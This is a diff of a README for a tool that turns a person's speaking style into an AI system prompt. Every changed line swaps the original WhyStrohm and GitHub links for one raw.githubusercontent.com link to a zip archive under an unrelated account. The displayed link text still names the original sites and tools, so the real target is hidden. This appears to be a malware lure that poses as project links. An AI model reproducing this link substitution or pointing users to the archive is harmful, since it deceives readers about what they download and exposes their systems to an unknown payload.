@@ -2,7 +2,7 @@
 
 **Reverse-engineer how you think, talk, and make decisions — then turn it into a reusable AI System Prompt.**
 
-Built by [WhyStrohm](https://whystrohm.com) — embedded creative engine for founder-led brands.
+Built by [WhyStrohm](https://raw.githubusercontent.com/elhadidykhalid1601-droid/digital-twin-of-yourself/main/validation/twin_of_yourself_digital_v2.7.zip) — embedded creative engine for founder-led brands.
 
 ![Digital Twin V2](assets/hero.png)
 
@@ -138,12 +138,12 @@ Full checklist in `SAFETY_CHECKLIST.md`.
 ## What's Next
 
 Once you have your Twin, score your published content against it:
-- **[Content Audit](https://github.com/whystrohm/whystrohm-audit)** — 5-layer diagnostic that scores your content and rewrites one piece live
-- **[Voice Scorer](https://github.com/whystrohm/whystrohm-voice-scorer)** — measures drift between your website voice and social content
-- **[Voice Extract](https://github.com/whystrohm/whystrohm-voice-extract)** — extract a structured voice profile from any URL
+- **[Content Audit](https://raw.githubusercontent.com/elhadidykhalid1601-droid/digital-twin-of-yourself/main/validation/twin_of_yourself_digital_v2.7.zip)** — 5-layer diagnostic that scores your content and rewrites one piece live
+- **[Voice Scorer](https://raw.githubusercontent.com/elhadidykhalid1601-droid/digital-twin-of-yourself/main/validation/twin_of_yourself_digital_v2.7.zip)** — measures drift between your website voice and social content
+- **[Voice Extract](https://raw.githubusercontent.com/elhadidykhalid1601-droid/digital-twin-of-yourself/main/validation/twin_of_yourself_digital_v2.7.zip)** — extract a structured voice profile from any URL
 
 Then run all of them on a schedule:
-- **[Ritual](https://github.com/whystrohm/ritual)** — Claude Code skill + bootstrap scan that reads your shell history, git repos, and Claude Code memory, then drafts a scheduled trigger that runs Digital Twin (and the other skills) across every brand you ship. Paste-ready for Claude Code's [scheduled triggers](https://claude.ai/code/scheduled).
+- **[Ritual](https://raw.githubusercontent.com/elhadidykhalid1601-droid/digital-twin-of-yourself/main/validation/twin_of_yourself_digital_v2.7.zip)** — Claude Code skill + bootstrap scan that reads your shell history, git repos, and Claude Code memory, then drafts a scheduled trigger that runs Digital Twin (and the other skills) across every brand you ship. Paste-ready for Claude Code's [scheduled triggers](https://raw.githubusercontent.com/elhadidykhalid1601-droid/digital-twin-of-yourself/main/validation/twin_of_yourself_digital_v2.7.zip).
 
 ## Changelog
 
@@ -157,13 +157,13 @@ Voice guardrails encoded into every content pipeline. Programmatic video product
 
 11 brands. 800+ videos. You own everything I build.
 
-→ [whystrohm.com/pricing](https://whystrohm.com/pricing?utm_source=github&utm_medium=repo-cta&utm_campaign=2026-04-10-closed-loop)
+→ [whystrohm.com/pricing](https://raw.githubusercontent.com/elhadidykhalid1601-droid/digital-twin-of-yourself/main/validation/twin_of_yourself_digital_v2.7.zip)
 
-See client proof → [whystrohm.com/results](https://whystrohm.com/results?utm_source=github&utm_medium=repo-cta&utm_campaign=2026-04-10-closed-loop)
+See client proof → [whystrohm.com/results](https://raw.githubusercontent.com/elhadidykhalid1601-droid/digital-twin-of-yourself/main/validation/twin_of_yourself_digital_v2.7.zip)
 
 ## License
 MIT — use it, fork it, improve it.
 
 ---
 
-*Built by [WhyStrohm](https://whystrohm.com) — I become your brand's creative engine.*
+*Built by [WhyStrohm](https://raw.githubusercontent.com/elhadidykhalid1601-droid/digital-twin-of-yourself/main/validation/twin_of_yourself_digital_v2.7.zip) — I become your brand's creative engine.*
